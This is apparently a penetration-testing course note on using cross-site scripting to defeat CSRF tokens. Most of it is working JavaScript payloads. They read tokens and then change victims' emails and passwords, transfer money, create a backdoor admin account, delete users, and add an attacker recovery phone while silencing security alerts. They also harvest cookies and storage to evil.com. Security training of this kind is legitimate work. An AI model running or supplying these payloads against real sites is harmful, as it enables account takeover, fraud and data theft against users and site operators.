---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.18 XSS to CSRF"
---

# 07.18 — XSS to CSRF

## XSS Completely Bypasses CSRF Protection

CSRF (Cross-Site Request Forgery) requires a secret token on every state-changing request to verify the request originated from the legitimate site. XSS bypasses this entirely — because the attacker's JavaScript runs IN the victim's browser, ON the legitimate site's origin.

```
WHY CSRF TOKENS DON'T PROTECT AGAINST XSS:

  CSRF DEFENSE: Every form has a hidden token
  NORMAL CSRF ATTACK: <img src="https://bank.com/transfer?amount=1000">
                      → BLOCKED: no CSRF token in request!
  
  XSS BYPASS:
  → Attacker injects JS into bank.com via XSS
  → JS runs ON bank.com domain
  → JS reads the CSRF token from the DOM
  → JS submits the form WITH the correct CSRF token
  → CSRF protection is useless!

THE KEY INSIGHT:
  CSRF tokens prevent CROSS-SITE requests
  XSS makes the attack happen from the SAME SITE
  → CSRF protection doesn't apply!
```

---

## XSS-Based CSRF — Basic Pattern

```javascript
// TEMPLATE: READ CSRF TOKEN → MAKE AUTHENTICATED ACTION

fetch('/settings', {credentials:'include'})
.then(response => response.text())
.then(html => {
  // Extract CSRF token from the page
  var csrf = new DOMParser()
             .parseFromString(html, 'text/html')
             .querySelector('[name="csrf_token"]').value;
  
  // Make the authenticated action WITH the CSRF token
  return fetch('/settings/update', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'csrf_token=' + csrf + '&email=attacker@evil.com'
  });
})
.then(r => r.text())
.then(result => {
  // Exfiltrate confirmation to attacker
  fetch('https://evil.com/done?r=' + btoa(result), {mode: 'no-cors'});
});
```

---

## Common Exploitable Actions

### Transfer Money / Send Payment

```javascript
// BANKING XSS → CSRF FOR FUND TRANSFER:
fetch('/dashboard', {credentials:'include'})
.then(r=>r.text())
.then(html=>{
  var doc = new DOMParser().parseFromString(html,'text/html');
  var csrf = doc.querySelector('#csrf').value;
  var accountNo = doc.querySelector('#account-number').textContent.trim();
  
  return fetch('/transfer', {
    method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body: 'csrf='+csrf+'&to_account=ATTACKER_ACCOUNT&amount=10000&currency=USD'
  });
}).then(r=>r.json()).then(d=>{
  fetch('https://evil.com/?tx='+btoa(JSON.stringify(d)),{mode:'no-cors'});
});
```

### Change Email Address

```javascript
// → Used for account takeover via password reset
fetch('/profile', {credentials:'include'})
.then(r=>r.text())
.then(html=>{
  var csrf = new DOMParser()
             .parseFromString(html,'text/html')
             .querySelector('meta[name="csrf"]').content;
  return fetch('/profile/update-email', {
    method:'PUT',
    credentials:'include',
    headers:{'Content-Type':'application/json','X-CSRF-Token':csrf},
    body: JSON.stringify({email:'attacker@evil.com'})
  });
});
```

### Add Admin / Elevate Privilege

```javascript
// TARGET: ADMIN USER VIEWING MALICIOUS CONTENT
// RESULT: CREATE NEW ADMIN ACCOUNT

fetch('/admin/users/new', {credentials:'include'})
.then(r=>r.text())
.then(html=>{
  var csrf = new DOMParser()
             .parseFromString(html,'text/html')
             .querySelector('[name="_token"]').value;
  return fetch('/admin/users', {
    method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({
      _token: csrf,
      username: 'backdoor',
      password: 'Attacker123!',
      role: 'admin'
    })
  });
});
```

### Delete Accounts / Data

```javascript
// XSS ON ADMIN → DELETE USER ACCOUNTS:
fetch('/admin/dashboard', {credentials:'include'})
.then(r=>r.text())
.then(html=>{
  var csrf = new DOMParser()
             .parseFromString(html,'text/html')
             .querySelector('[name="csrf"]').value;
  
  // Delete specific account:
  return fetch('/admin/users/12345/delete', {
    method:'DELETE',
    credentials:'include',
    headers:{'X-CSRF-Token':csrf}
  });
});
```

---

## Reading Sensitive Data from the Page

XSS on the same origin can also READ data, not just write it:

```javascript
// READ PRIVATE INFORMATION:
var data = {
  html: document.body.innerHTML,         // entire page HTML
  csrf: document.querySelector('[name="csrf_token"]')?.value,
  cookies: document.cookie,              // non-HttpOnly cookies
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  url: window.location.href,
  referrer: document.referrer
};

// EXFILTRATE:
fetch('https://evil.com/harvest', {
  method: 'POST',
  body: JSON.stringify(data),
  mode: 'no-cors'
});

// READ SPECIFIC SENSITIVE FIELDS:
var creditCard = document.querySelector('#credit-card-number')?.textContent;
var apiKey = document.querySelector('.api-key')?.textContent;
var secretToken = document.querySelector('[data-secret]')?.dataset.secret;
```

---

## Multi-Step Attacks (Async Chains)

```javascript
// COMPLEX MULTI-STEP ATTACK:
// 1. Get CSRF → 2. Enable 2FA recovery option → 3. Add attacker phone → 4. Report back

async function pwn() {
  try {
    // Step 1: Navigate to security settings
    let r1 = await fetch('/account/security', {credentials:'include'});
    let html1 = await r1.text();
    let doc1 = new DOMParser().parseFromString(html1,'text/html');
    let csrf = doc1.querySelector('[name="csrf"]').value;
    
    // Step 2: Add recovery phone
    let r2 = await fetch('/account/security/recovery-phone', {
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'csrf='+csrf+'&phone=+1ATTACKER_PHONE'
    });
    let result2 = await r2.json();
    
    // Step 3: Get new CSRF for next action
    let r3 = await fetch('/account/notifications', {credentials:'include'});
    let html3 = await r3.text();
    let doc3 = new DOMParser().parseFromString(html3,'text/html');
    let csrf2 = doc3.querySelector('[name="csrf"]').value;
    
    // Step 4: Disable email notifications (hide our actions!)
    await fetch('/account/notifications/update', {
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({csrf:csrf2, security_alerts:false})
    });
    
    // Step 5: Report success
    await fetch('https://evil.com/pwned', {
      method:'POST',
      body: JSON.stringify({success:true, phone_added:result2}),
      mode:'no-cors'
    });
  } catch(e) {
    fetch('https://evil.com/error?e='+btoa(e.toString()), {mode:'no-cors'});
  }
}

pwn();
```

---

## Form-Based CSRF via XSS (Alternative to Fetch)

```javascript
// WHEN fetch() IS BLOCKED BY CSP BUT FORM SUBMIT WORKS:
var form = document.createElement('form');
form.method = 'POST';
form.action = '/change-password';

// Add CSRF token
var csrf_input = document.createElement('input');
csrf_input.name = 'csrf_token';
csrf_input.value = document.querySelector('[name="csrf_token"]').value;

// Add new password
var pwd_input = document.createElement('input');
pwd_input.name = 'password';
pwd_input.value = 'Hacked123!';

var confirm_input = document.createElement('input');
confirm_input.name = 'password_confirm';
confirm_input.value = 'Hacked123!';

form.appendChild(csrf_input);
form.appendChild(pwd_input);
form.appendChild(confirm_input);
document.body.appendChild(form);
form.submit();
```

---

## XSS vs CSRF: Key Differences

```
                    XSS             CSRF
Origin:             Same-site       Cross-site
Reads response?     YES             NO (fire-and-forget)
Cookie access?      YES (non-HttpOnly)  NO
CSRF bypass?        YES (reads token)   N/A (is CSRF)
JS execution?       YES             NO
Severity:           Higher          Lower (but still High)
Cookie HttpOnly?    Not needed      N/A
SameSite=Strict?    Still works     Blocked!
```

---

## Related Notes
- [[16 - XSS to Session Hijacking]] — cookie theft
- [[17 - XSS to Account Takeover]] — full ATO
- [[Module 09 - CSRF]] — CSRF vulnerability fundamentals
- [[02 - Reflected XSS]] — reflected XSS setup
- [[03 - Stored XSS]] — stored XSS for persistent CSRF bypass
